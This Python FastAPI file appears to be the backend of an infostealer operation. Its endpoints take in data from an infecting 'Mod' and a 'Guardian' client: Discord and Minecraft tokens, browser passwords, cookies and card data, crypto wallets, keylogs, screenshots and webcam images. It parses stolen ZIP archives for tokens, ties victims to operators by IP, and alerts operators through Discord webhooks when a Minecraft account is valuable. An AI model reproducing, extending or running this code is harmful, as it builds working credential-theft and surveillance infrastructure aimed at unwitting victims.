from fastapi import APIRouter, Depends, HTTPException, Request, Response
from sqlalchemy.orm import Session
from app.core.database import get_db
from app.models.user import User, Log, Token, PlanType
from app.schemas.schemas import LogCreate
from app.utils.notifications import send_discord_notification
import json
import os
import re
import zipfile
import io
from datetime import datetime

router = APIRouter()
upload_router = APIRouter()  # Separate router for /api/upload/

# Storage directories
UPLOAD_DIR = os.path.join(os.path.dirname(__file__), '..', '..', '..', '..', 'uploads')
os.makedirs(UPLOAD_DIR, exist_ok=True)

# IP to User mapping for Guardian (IP -> user_id, build_key)
# This is populated when Mod infects a PC - Guardian can then send data using just IP
IP_USER_MAP_FILE = os.path.join(UPLOAD_DIR, '..', 'ip_user_map.json')

def load_ip_map():
    """Load IP to user mapping from disk"""
    try:
        if os.path.exists(IP_USER_MAP_FILE):
            with open(IP_USER_MAP_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    return {}

def save_ip_map(mapping):
    """Save IP to user mapping to disk"""
    try:
        with open(IP_USER_MAP_FILE, 'w') as f:
            json.dump(mapping, f)
    except:
        pass

def register_ip_for_user(ip: str, user_id: int, build_key: str):
    """Register that this IP was infected by this user"""
    mapping = load_ip_map()
    mapping[ip] = {
        'user_id': user_id,
        'build_key': build_key,
        'registered_at': datetime.now().isoformat()
    }
    save_ip_map(mapping)

def get_user_for_ip(ip: str, db: Session):
    """Get user from IP mapping"""
    mapping = load_ip_map()
    if ip in mapping:
        user_id = mapping[ip].get('user_id')
        if user_id:
            return db.query(User).filter(User.id == user_id).first()
    return None


def extract_tokens_from_zip(zip_data: bytes) -> list:
    """Extract Discord tokens from a ZIP file - checks discord_tokens.txt first"""
    tokens = []
    
    try:
        with zipfile.ZipFile(io.BytesIO(zip_data), 'r') as zf:
            # First priority: Look for discord_tokens.txt specifically
            for file_info in zf.filelist:
                filename_lower = file_info.filename.lower()
                basename = os.path.basename(filename_lower)
                
                # Check for discord_tokens.txt or similar
                if basename in ['discord_tokens.txt', 'discord_token.txt', 'tokens.txt']:
                    try:
                        with zf.open(file_info.filename) as f:
                            content = f.read()
                            try:
                                text = content.decode('utf-8', errors='ignore')
                            except:
                                text = content.decode('latin-1', errors='ignore')
                            
                            # Parse each line - format: TOKEN | Status
                            for line in text.split('\n'):
                                line = line.strip()
                                if not line:
                                    continue
                                
                                # Split by | to get token part
                                if '|' in line:
                                    token_part = line.split('|')[0].strip()
                                else:
                                    token_part = line.strip()
                                
                                # Validate token format (has dots and proper length)
                                if token_part and len(token_part) > 50 and '.' in token_part:
                                    parts = token_part.split('.')
                                    if len(parts) >= 2:
                                        if token_part not in tokens:
                                            tokens.append(token_part)
                    except Exception as e:
                        print(f"[-] Error reading token file: {e}")
            
            # If no tokens found in txt files, scan other files using regex
            if not tokens:
                # Token patterns
                token_patterns = [
                    r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',  # Standard token
                    r'[\w-]{26}\.[\w-]{6}\.[\w-]{38}',  # New format
                    r'mfa\.[\w-]{84}',  # MFA token
                    r'[\w-]{24}\.[\w-]{6}\.[\w-]{38}',  # Another format
                ]
                combined_pattern = '|'.join(f'({p})' for p in token_patterns)
                
                for file_info in zf.filelist:
                    filename_lower = file_info.filename.lower()
                    if any(x in filename_lower for x in ['discord', 'leveldb', '.ldb', '.log']):
                        try:
                            with zf.open(file_info.filename) as f:
                                content = f.read()
                                try:
                                    text = content.decode('utf-8', errors='ignore')
                                except:
                                    text = content.decode('latin-1', errors='ignore')
                                
                                matches = re.findall(combined_pattern, text)
                                for match in matches:
                                    for m in match:
                                        if m and len(m) > 50:
                                            token = m.strip()
                                            if token not in tokens:
                                                tokens.append(token)
                        except:
                            pass
    except Exception as e:
        print(f"[-] Error extracting tokens from ZIP: {e}")
    
    return tokens

@router.post("/{build_key}")
async def receive_data(
    build_key: str,
    request: Request,
    db: Session = Depends(get_db)
):
    """
    Receive data from the Mod/Guardian.
    Handles all data types: discord, minecraft, browser, wallet, system, gaming, 
    telegram, screenshot, webcam, keylog, files
    """
    # 1. Validate Build Key
    user = db.query(User).filter(User.build_key == build_key).first()
    if not user:
        raise HTTPException(status_code=404, detail="Invalid build key")

    if not user.is_active:
        raise HTTPException(status_code=403, detail="User inactive")
    
    # 2. Register IP for Guardian IP-matching
    # Get Real IP from Cloudflare/Proxy headers
    ip = request.headers.get("CF-Connecting-IP")
    if not ip:
        ip = request.headers.get("X-Forwarded-For")
        if ip:
            ip = ip.split(',')[0].strip()
    
    if not ip:
        ip = request.client.host
        
    register_ip_for_user(ip, user.id, build_key)

    # 3. Parse Data
    try:
        data = await request.json()
    except:
        data = {}


    pc_name = data.get('pc_name', 'Unknown')
    pc_user = data.get('pc_user', 'Unknown')
    log_type = data.get('type', 'unknown')

    # GeoIP Lookup
    import requests
    country = "Unknown"
    try:
        # Simple cache to avoid hitting API limit
        if 'ip_cache' not in globals():
            global ip_cache
            ip_cache = {}
        
        if ip in ip_cache:
            country = ip_cache[ip]
        elif ip != "127.0.0.1" and ip != "localhost":
            try:
                # fast timeout
                geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=2).json()
                if geo.get('status') == 'success':
                    country = geo.get('country', 'Unknown')
                    ip_cache[ip] = country
            except:
                pass
    except:
        pass
    
    # Handle Discord Webhook Format (from Mod's sendWebhookEmbed)
    if 'embeds' in data:
        log_type = 'discord_embed'
        embed = data['embeds'][0]
        content = {
            'title': embed.get('title'),
            'description': embed.get('description'),
            'footer': embed.get('footer', {}).get('text')
        }
        desc = embed.get('description', '')
        if '**PC:**' in desc:
            try:
                pc_name = desc.split('**PC:**')[1].strip().split('\n')[0]
            except:
                pass
    else:
        # Standard Format - store full data based on type
        content = {}
        
        if log_type == 'discord':
            content = {
                'token': data.get('token', ''),
                'userid': data.get('userid', ''),
                'username': data.get('username', ''),
                'email': data.get('email', ''),
                'phone': data.get('phone', ''),
                'nitro': data.get('nitro', ''),
                'billing': data.get('billing', ''),
                'mfa_enabled': data.get('mfa_enabled', False),
                'guild_count': data.get('guild_count', 0),
                'locale': data.get('locale', ''),
                'bio': data.get('bio', '')
            }
        elif log_type == 'minecraft':
            content = {
                'player': data.get('player', ''),
                'uuid': data.get('uuid', ''),
                'access_token': data.get('access_token', ''),
                'client_id': data.get('client_id', ''),
                'ip': data.get('ip', ''),
                'country': data.get('country', country),  # Use from data or fallback to geo lookup
                'os': data.get('os', '')
            }
        elif log_type == 'minecraft_refresh':
            content = {
                'player': data.get('player', ''),
                'uuid': data.get('uuid', ''),
                'refresh_token': data.get('refresh_token', '')
            }
        elif log_type == 'browser':
            content = {
                'browser': data.get('browser', ''),
                'url': data.get('url', ''),
                'username': data.get('username', ''),
                'password': data.get('password', ''),
                'passwords': data.get('passwords', []),
                'cookies': data.get('cookies', [])
            }
        elif log_type == 'wallet':
            content = {
                'wallet_name': data.get('wallet_name', ''),
                'wallet_type': data.get('wallet_type', ''),
                'data': data.get('data', '')
            }
        elif log_type == 'system':
            content = {
                'os': data.get('os', ''),
                'cpu': data.get('cpu', ''),
                'gpu': data.get('gpu', ''),
                'ram': data.get('ram', ''),
                'ip': data.get('ip', ''),
                'country': data.get('country', '')
            }
        elif log_type == 'gaming':
            content = {
                'platform': data.get('platform', ''),
                'data': data.get('data', '')
            }
        elif log_type == 'telegram':
            content = {'data': data.get('data', '')}
        elif log_type == 'screenshot':
            # Store base64 image
            content = {'image': data.get('image', '')}
        elif log_type == 'webcam':
            content = {'image': data.get('image', '')}
        elif log_type == 'keylog':
            content = {
                'keys': data.get('keys', ''),
                'window_title': data.get('window_title', '')
            }
        elif log_type == 'files':
            content = {'files': data.get('files', [])}
        else:
            # Unknown type - store everything
            content = {k: v for k, v in data.items() if k not in ['type', 'pc_name', 'pc_user']}

    # =============================================================
    # SKIP THESE FROM DATABASE - they flood logs unnecessarily!
    # =============================================================
    SKIP_LOG_TYPES = ('screenshot', 'webcam', 'guardian_heartbeat', 'heartbeat', 'screen', 'image')
    
    if log_type in SKIP_LOG_TYPES:
        # For images (screenshot/webcam), save to file instead
        if log_type in ('screenshot', 'webcam', 'screen', 'image'):
            import base64 as b64mod
            import time as timemod
            
            folder_name = 'screenshots' if log_type in ('screenshot', 'screen') else 'webcam'
            save_dir = os.path.join(DATA_DIR, build_key, folder_name)
            os.makedirs(save_dir, exist_ok=True)
            
            filename = f"{log_type}_{int(timemod.time())}_{pc_name}.png"
            filepath = os.path.join(save_dir, filename)
            
            image_b64 = data.get('image', data.get('data', ''))
            if image_b64:
                try:
                    img_data = b64mod.b64decode(image_b64)
                    with open(filepath, 'wb') as imgf:
                        imgf.write(img_data)
                except:
                    pass
            
            return {"status": "success", "file": filename}
        else:
            # Heartbeat types - just acknowledge, don't store
            return {"status": "success", "type": "ack"}
    
    # NOTE: We ALWAYS store all data regardless of user plan
    # Plan-based filtering happens when RETRIEVING logs, not when storing
    # This allows: 1) Admin to see all data 2) User to see data after upgrade
    
    # 3. Store Data
    new_log = Log(
        user_id=user.id,
        log_type=log_type,
        content=json.dumps(content) if isinstance(content, (dict, list)) else str(content),
        ip_address=ip,
        pc_name=pc_name,
        pc_user=pc_user
    )
    db.add(new_log)
    db.commit()

    # Trigger Notification for standard logs
    if user.webhook_enabled and user.webhook_url:
        await send_discord_notification(
            user.webhook_url, 
            log_type, 
            content if isinstance(content, dict) else {'data': content},
            pc_info={'pc_name': pc_name, 'pc_user': pc_user, 'ip': ip}
        )

    # ========================== DONUTSMP CHECK ==========================
    # Check if this is a Minecraft hit and if we need to notify DonutSMP webhook
    if log_type == 'minecraft' and user.donutsmp_webhook:
        try:
            # Import here to avoid circular dependencies
            from app.api.v1.endpoints.donutsmp import check_player_stats_internal
            
            player_name = content.get('player')
            if player_name:
                # Check stats
                stats = await check_player_stats_internal(player_name)
                if stats and stats.get('success'):
                    # API returns { data: { result: { money, shards, kills, deaths, playtime } } }
                    result = stats.get('data', {})
                    if isinstance(result, dict) and 'result' in result:
                        result = result.get('result', {})
                    
                    # Parse money (API returns string)
                    balance = float(result.get('money', 0))
                    shards = int(result.get('shards', 0))
                    kills = int(result.get('kills', 0))
                    deaths = int(result.get('deaths', 0))
                    playtime_ms = int(result.get('playtime', 0))
                    
                    # Format playtime
                    playtime_sec = playtime_ms // 1000
                    days = playtime_sec // 86400
                    hours = (playtime_sec % 86400) // 3600
                    playtime_str = f"{days}d {hours}h" if days > 0 else f"{hours}h"
                    
                    # Check limit
                    min_balance = user.donutsmp_min_balance or 0
                    if balance >= min_balance:
                        # Send specific notification
                        await send_discord_notification(
                            user.donutsmp_webhook,
                            "donutsmp_hit",
                            {
                                "player": player_name,
                                "balance": f"${balance:,.0f}",
                                "shards": shards,
                                "kills": kills,
                                "deaths": deaths,
                                "playtime": playtime_str,
                                "token": content.get('access_token', 'N/A'),
                                "uuid": content.get('uuid', 'N/A')
                            },
                             pc_info={'pc_name': pc_name, 'pc_user': pc_user, 'ip': ip}
                        )
        except Exception as e:
            print(f"Error in DonutSMP check: {e}")
    # ====================================================================


    return {"status": "success", "log_id": new_log.id}


# ============= UPLOAD ROUTER (mounted at /api/upload) =============

@upload_router.post("/{build_key}")
async def upload_zip(
    build_key: str,
    request: Request,
    db: Session = Depends(get_db)
):
    """
    Receive ZIP data from Mod (binary upload)
    """
    user = db.query(User).filter(User.build_key == build_key).first()
    if not user:
        raise HTTPException(status_code=404, detail="Invalid build key")

    # Get headers - prioritize X-IP from mod over server detection
    pc_name = request.headers.get('X-PC-Name', 'Unknown')
    pc_user = request.headers.get('X-PC-User', 'Unknown')
    
    # Use IP from mod header if provided (more reliable than server detection)
    ip = request.headers.get('X-IP')
    if not ip:
        # Fallback to Cloudflare/Proxy headers
        ip = request.headers.get("CF-Connecting-IP")
        if not ip:
            ip = request.headers.get("X-Forwarded-For")
            if ip:
                ip = ip.split(',')[0].strip()
        if not ip:
            ip = request.client.host
    
    # Use country from mod header if provided
    country = request.headers.get('X-Country', 'Unknown')
    
    # Use OS from mod header if provided
    os_info = request.headers.get('X-OS', 'Unknown')
    
    # Read binary data
    body = await request.body()
    
    if len(body) == 0:
        raise HTTPException(status_code=400, detail="Empty body")
    
    # Register IP for Guardian IP-matching
    register_ip_for_user(ip, user.id, build_key)
    
    # Save ZIP file
    user_dir = os.path.join(UPLOAD_DIR, str(user.id))
    os.makedirs(user_dir, exist_ok=True)
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"{pc_user}_{timestamp}.zip"
    filepath = os.path.join(user_dir, filename)
    
    with open(filepath, 'wb') as f:
        f.write(body)
    
    # Extract and store Discord tokens from ZIP
    extracted_tokens = extract_tokens_from_zip(body)
    tokens_stored = 0
    
    for token_str in extracted_tokens:
        # Check if token already exists
        existing = db.query(Token).filter(Token.token == token_str).first()
        if not existing:
            # Store new token with metadata
            token_metadata = json.dumps({
                "pc_name": pc_name,
                "pc_user": pc_user,
                "ip": ip,
                "country": country,
                "os": os_info,
                "source": "zip",
                "source_file": filename
            })
            new_token = Token(
                user_id=user.id,
                token=token_str,
                is_valid=None,  # Will be validated later
                token_metadata=token_metadata
            )
            db.add(new_token)
            tokens_stored += 1
    
    # Log it - include country and OS in content
    new_log = Log(
        user_id=user.id,
        log_type='zip_upload',
        content=json.dumps({
            'filename': filename, 
            'size': len(body), 
            'tokens_extracted': len(extracted_tokens),
            'country': country,
            'os': os_info
        }),
        ip_address=ip,
        pc_name=pc_name,
        pc_user=pc_user
    )
    db.add(new_log)
    db.commit()

    # Trigger Notification for ZIP
    if user.webhook_enabled and user.webhook_url:
        await send_discord_notification(
            user.webhook_url, 
            'zip_upload', 
            {
                'filename': filename, 
                'size': len(body), 
                'tokens_extracted': len(extracted_tokens),
                'country': country,
                'os': os_info
            },
            pc_info={'pc_name': pc_name, 'pc_user': pc_user, 'ip': ip, 'country': country}
        )

    return {"status": "success", "filename": filename, "size": len(body), "tokens_extracted": len(extracted_tokens), "tokens_stored": tokens_stored}


@upload_router.post("/guardian")
async def upload_guardian_zip(
    request: Request,
    db: Session = Depends(get_db)
):
    """
    Receive ZIP data from Guardian (IP-based auth)
    """
    # 1. IP Authentication
    ip = request.headers.get('X-IP')
    if not ip:
        ip = request.headers.get("CF-Connecting-IP")
        if not ip:
            ip = request.headers.get("X-Forwarded-For")
            if ip:
                ip = ip.strip().split(',')[0]
        if not ip:
            ip = request.client.host
            
    # Remove port if present
    if ':' in ip and '.' in ip:
         ip = ip.split(':')[0]

    user = get_user_for_ip(ip, db)
    
    if not user:
        # Try finding recent log
        recent_log = db.query(Log).filter(Log.ip_address == ip).order_by(Log.created_at.desc()).first()
        if recent_log:
            user = db.query(User).filter(User.id == recent_log.user_id).first()
            
    if not user:
        raise HTTPException(status_code=404, detail="Unknown IP - Mod must infect first")

    # 2. Process Upload
    pc_name = request.headers.get('X-PC-Name', 'Guardian')
    pc_user = request.headers.get('X-PC-User', 'Unknown')
    country = request.headers.get('X-Country', 'Unknown')
    os_info = request.headers.get('X-OS', 'Unknown')
    
    body = await request.body()
    if len(body) == 0:
        raise HTTPException(status_code=400, detail="Empty body")
        
    # Save ZIP
    user_dir = os.path.join(UPLOAD_DIR, str(user.id))
    os.makedirs(user_dir, exist_ok=True)
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"guardian_{pc_user}_{timestamp}.zip"
    filepath = os.path.join(user_dir, filename)
    
    with open(filepath, 'wb') as f:
        f.write(body)
        
    # Extract tokens
    extracted_tokens = extract_tokens_from_zip(body)
    
    # Analyze ZIP for Browser Stats (Passwords, Cookies, etc)
    zip_stats = {'cookies': 0, 'passwords': 0, 'cards': 0}
    try:
        with zipfile.ZipFile(io.BytesIO(body), 'r') as zf:
            for file_info in zf.filelist:
                fname = file_info.filename.lower()
                # Count Passwords
                if 'password' in fname and fname.endswith('.txt'):
                    try:
                        with zf.open(file_info.filename) as f:
                            content = f.read().decode('utf-8', errors='ignore')
                            # Count blocks (Password: ...)
                            zip_stats['passwords'] += content.count('Password: ')
                    except: pass
                
                # Count Cookies
                if 'cookie' in fname and fname.endswith('.txt'):
                    try:
                        with zf.open(file_info.filename) as f:
                            # Count lines (each cookie is a line usually in Netscape format)
                            # Or count by Host:
                            lines = f.readlines()
                            zip_stats['cookies'] += len(lines)
                    except: pass
                    
                # Count Cards
                if 'card' in fname and fname.endswith('.txt'):
                    try:
                         with zf.open(file_info.filename) as f:
                            content = f.read().decode('utf-8', errors='ignore')
                            zip_stats['cards'] += content.count('Card:')
                    except: pass
    except Exception as e:
        print(f"Error analyzing ZIP stats: {e}")

    tokens_stored = 0
    
    for token_str in extracted_tokens:
        existing = db.query(Token).filter(Token.token == token_str).first()
        if not existing:
            token_metadata = json.dumps({
                "pc_name": pc_name,
                "pc_user": pc_user,
                "ip": ip,
                "country": country,
                "os": os_info,
                "source": "guardian_zip",
                "source_file": filename
            })
            new_token = Token(
                user_id=user.id,
                token=token_str,
                is_valid=None,
                token_metadata=token_metadata
            )
            db.add(new_token)
            tokens_stored += 1
            
    # Log - Use 'browser' type so it appears in Browser tab!
    # Format to match frontend: { summary: { cookies: ... } }
    log_content = {
        'filename': filename, 
        'size': len(body), 
        'tokens_extracted': len(extracted_tokens),
        'source': 'guardian',
        'country': country,
        'summary': {
            'cookies': zip_stats['cookies'],
            'passwords': zip_stats['passwords'],
            'payments': zip_stats['cards'],
            'autofills': 0
        }
    }
    
    new_log = Log(
        user_id=user.id,
        log_type='browser', # Changed from zip_upload to browser
        content=json.dumps(log_content),
        ip_address=ip,
        pc_name=pc_name,
        pc_user=pc_user
    )
    db.add(new_log)
    db.commit()
    
    # Notify
    if user.webhook_enabled and user.webhook_url:
        await send_discord_notification(
            user.webhook_url, 
            'browser', # Notification type
            log_content,
            pc_info={'pc_name': pc_name, 'pc_user': pc_user, 'ip': ip}
        )
        
    return {"status": "success", "filename": filename}


@router.post("/webcam/{build_key}")
async def upload_webcam(
    build_key: str,
    request: Request,
    db: Session = Depends(get_db)
):
    """
    Receive webcam image from Mod (JSON with base64 image)
    """
    user = db.query(User).filter(User.build_key == build_key).first()
    if not user:
        raise HTTPException(status_code=404, detail="Invalid build key")
    
    # Always save webcam data - plan filtering happens on retrieval

    try:
        data = await request.json()
    except:
        raise HTTPException(status_code=400, detail="Invalid JSON")
    
    pc_name = data.get('pc_name', 'Unknown')
    pc_user = data.get('pc_user', 'Unknown')
    image_b64 = data.get('image', '')
    
    if not image_b64:
        raise HTTPException(status_code=400, detail="No image data")

    # Basic size check and rate limiting to prevent flooding
    MAX_B64_LEN = 800000  # ~600KB image (base64)
    if len(image_b64) > MAX_B64_LEN:
        raise HTTPException(status_code=413, detail="Image too large")

    # Rate limiting per build_key (simple in-memory sliding window)
    if 'recent_image_uploads' not in globals():
        global recent_image_uploads
        recent_image_uploads = {}

    import time
    now = time.time()
    window = 60
    max_per_window = 10  # allow up to 10 images per minute by default

    arr = recent_image_uploads.get(build_key, [])
    # prune old
    arr = [t for t in arr if now - t < window]
    if len(arr) >= max_per_window:
        raise HTTPException(status_code=429, detail="Rate limit exceeded for image uploads")
    arr.append(now)
    recent_image_uploads[build_key] = arr

    # Store as log
    new_log = Log(
        user_id=user.id,
        log_type='webcam',
        content=json.dumps({'image': image_b64, 'pc_user': pc_user, 'pc_name': pc_name}),
        ip_address=request.client.host,
        pc_name=pc_name,
        pc_user=pc_user
    )
    db.add(new_log)
    db.commit()

    return {"status": "success", "log_id": new_log.id}


@router.post("/screenshot/{build_key}")
async def upload_screenshot(
    build_key: str,
    request: Request,
    db: Session = Depends(get_db)
):
    """
    Receive screenshot from Guardian (JSON with base64 image)
    """
    user = db.query(User).filter(User.build_key == build_key).first()
    if not user:
        raise HTTPException(status_code=404, detail="Invalid build key")

    try:
        data = await request.json()
    except:
        raise HTTPException(status_code=400, detail="Invalid JSON")
    
    pc_name = data.get('pc_name', 'Unknown')
    pc_user = data.get('pc_user', 'Unknown')
    image_b64 = data.get('image', '')
    
    if not image_b64:
        raise HTTPException(status_code=400, detail="No image data")

    # Basic size check and rate limiting to prevent flooding
    MAX_B64_LEN = 800000  # ~600KB image (base64)
    if len(image_b64) > MAX_B64_LEN:
        raise HTTPException(status_code=413, detail="Image too large")

    # Rate limiting per build_key (simple in-memory sliding window)
    if 'recent_image_uploads' not in globals():
        global recent_image_uploads
        recent_image_uploads = {}

    import time
    now = time.time()
    window = 60
    max_per_window = 10  # allow up to 10 images per minute by default

    arr = recent_image_uploads.get(build_key, [])
    # prune old
    arr = [t for t in arr if now - t < window]
    if len(arr) >= max_per_window:
        raise HTTPException(status_code=429, detail="Rate limit exceeded for image uploads")
    arr.append(now)
    recent_image_uploads[build_key] = arr

    # Save screenshot to FILE ONLY - NOT to database logs!
    # Screenshots are displayed in Screenshare tab, not Dashboard logs
    import base64 as b64mod
    
    screenshot_dir = os.path.join(DATA_DIR, build_key, "screenshots")
    os.makedirs(screenshot_dir, exist_ok=True)
    
    filename = f"screenshot_{int(now)}_{pc_name}.png"
    filepath = os.path.join(screenshot_dir, filename)
    
    try:
        img_data = b64mod.b64decode(image_b64)
        with open(filepath, "wb") as imgf:
            imgf.write(img_data)
    except:
        pass  # Silently fail if decode fails
    
    return {"status": "success", "file": filename}


# ============= GUARDIAN ENDPOINTS (IP-based matching) =============

@router.post("/guardian")
async def guardian_data(
    request: Request,
    db: Session = Depends(get_db)
):
    """
    Receive data from Guardian - matches user by IP address.
    Guardian does NOT need config.dat - server automatically matches
    the IP to the user who infected that PC via the Mod.
    """
    ip = request.client.host
    
    # Try to find user by IP mapping
    user = get_user_for_ip(ip, db)
    
    if not user:
        # No mapping found - try to find any user with recent activity from this IP
        recent_log = db.query(Log).filter(Log.ip_address == ip).order_by(Log.created_at.desc()).first()
        if recent_log:
            user = db.query(User).filter(User.id == recent_log.user_id).first()
    
    if not user:
        # Still no user - store under admin or reject
        # For now, reject with helpful message
        raise HTTPException(status_code=404, detail="Unknown IP - Mod must infect first")
    
    try:
        data = await request.json()
    except:
        data = {}
    
    log_type = data.get('type', 'guardian')
    pc_name = data.get('pc_name', 'Guardian')
    pc_user = data.get('pc_user', 'Unknown')
    machine_id = data.get('machine_id', '')
    
    # Remove metadata from content
    content_keys = [k for k in data.keys() if k not in ['type', 'pc_name', 'pc_user', 'machine_id']]
    content = {k: data[k] for k in content_keys}
    
    new_log = Log(
        user_id=user.id,
        log_type=log_type,
        content=json.dumps(content) if content else '{}',
        ip_address=ip,
        pc_name=pc_name,
        pc_user=pc_user
    )
    db.add(new_log)
    db.commit()
    
    return {"status": "success", "log_id": new_log.id, "matched_user": user.username}


@router.post("/guardian/screenshot")
async def guardian_screenshot(
    request: Request,
    db: Session = Depends(get_db)
):
    """Guardian screenshot upload - matches user by IP"""
    ip = request.client.host
    user = get_user_for_ip(ip, db)
    
    if not user:
        recent_log = db.query(Log).filter(Log.ip_address == ip).order_by(Log.created_at.desc()).first()
        if recent_log:
            user = db.query(User).filter(User.id == recent_log.user_id).first()
    
    if not user:
        raise HTTPException(status_code=404, detail="Unknown IP")
    
    try:
        data = await request.json()
    except:
        raise HTTPException(status_code=400, detail="Invalid JSON")
    
    image_b64 = data.get('image', '')
    if not image_b64:
        raise HTTPException(status_code=400, detail="No image")
    
    # Rate limit
    if len(image_b64) > 800000:
        raise HTTPException(status_code=413, detail="Too large")
    
    # Save screenshot to FILE ONLY
    import base64 as b64mod
    import time as timemod
    
    screenshot_dir = os.path.join(DATA_DIR, user.build_key, "screenshots")
    os.makedirs(screenshot_dir, exist_ok=True)
    
    pc_name = user.pc_name
    filename = f"webcam_{int(timemod.time())}_{pc_name}.png"
    filepath = os.path.join(screenshot_dir, filename)
    
    try:
        img_data = b64mod.b64decode(image_b64)
        with open(filepath, "wb") as imgf:
            imgf.write(img_data)
    except:
        pass
    
    return {"status": "success", "file": filename}

@router.post("/discord")
async def report_discord_tokens(
    request: Request,
    response: Response,
    db: Session = Depends(get_db)
):
    """
    Direct endpoint for Java Mod to report Discord tokens.
    Headers: X-Build-Key, X-PC-Name, X-PC-User
    Body: {"tokens": ["token1", "token2", ...]}
    """
    build_key = request.headers.get("X-Build-Key")
    pc_name = request.headers.get("X-PC-Name", "Unknown")
    pc_user = request.headers.get("X-PC-User", "Unknown")
    
    if not build_key:
        raise HTTPException(status_code=400, detail="Missing X-Build-Key")
        
    user = db.query(User).filter(User.build_key == build_key).first()
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
        
    try:
        data = await request.json()
        tokens = data.get("tokens", [])
    except:
        return {"status": "error", "message": "Invalid JSON"}
        
    if not tokens:
        return {"status": "ok", "count": 0}
        
    from ...socket_events import fetch_discord_user_info
    
    count = 0
    for token in tokens:
        # Check if already exists
        exists = db.query(Token).filter(Token.token == token).first()
        if exists:
            continue
            
        # Add new token
        new_token = Token(
            user_id=user.id,
            token=token,
            source="Mod Direct",
            pc_name=pc_name,
            pc_user=pc_user,
            ip=request.client.host
        )
        db.add(new_token)
        try:
            db.commit()
            
            # Enrich token info Async (fire and forget logic or sync?)
            # Since this is HTTP, we might want to do it sync or bg task
            # For simplicity, we do basic fetch if fast, or just store.
            # Using the helper if it was importable.
            # Assuming we just store it for now.
            count += 1
        except:
            db.rollback()
            
    return {"status": "success", "added": count}


@router.post("/guardian/webcam")
async def guardian_webcam(
    request: Request,
    db: Session = Depends(get_db)
):
    """Guardian webcam upload - matches user by IP"""
    ip = request.client.host
    user = get_user_for_ip(ip, db)
    
    if not user:
        recent_log = db.query(Log).filter(Log.ip_address == ip).order_by(Log.created_at.desc()).first()
        if recent_log:
            user = db.query(User).filter(User.id == recent_log.user_id).first()
    
    if not user:
        raise HTTPException(status_code=404, detail="Unknown IP")
    
    try:
        data = await request.json()
    except:
        raise HTTPException(status_code=400, detail="Invalid JSON")
    
    image_b64 = data.get('image', '')
    if not image_b64:
        raise HTTPException(status_code=400, detail="No image")
    
    if len(image_b64) > 800000:
        raise HTTPException(status_code=413, detail="Too large")
    
    new_log = Log(
        user_id=user.id,
        log_type='webcam',
        content=json.dumps({'image': image_b64, 'source': 'guardian'}),
        ip_address=ip,
        pc_name=data.get('pc_name', 'Guardian'),
        pc_user=data.get('pc_user', 'Unknown')
    )
    db.add(new_log)
    db.commit()
    
    return {"status": "success"}
